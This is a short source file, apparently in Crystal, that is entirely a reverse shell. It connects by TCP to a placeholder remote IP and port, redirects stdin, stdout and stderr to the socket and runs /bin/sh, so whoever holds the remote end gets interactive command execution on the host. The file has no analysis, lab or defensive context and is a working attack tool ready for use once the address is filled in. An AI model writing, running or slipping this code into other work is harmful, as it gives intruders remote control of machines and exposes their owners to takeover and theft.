require "socket"
require "process"

# Constants for the remote address and port
REMOTE_ADDR = "<ip>"
REMOTE_PORT = <port number>
begin
  # Create a TCP socket and connect to the remote address and port
  socket = TCPSocket.new(REMOTE_ADDR, REMOTE_PORT)

  # Duplicate the socket file descriptor for stdin, stdout, and stderr
  STDOUT.reopen(socket)
  STDERR.reopen(socket)
  STDIN.reopen(socket)

  # Execute a new shell process, inheriting the file descriptors
  Process.run("/bin/sh", shell: true)
rescue e
  puts "Failed to connect or execute shell: #{e.message}"
end
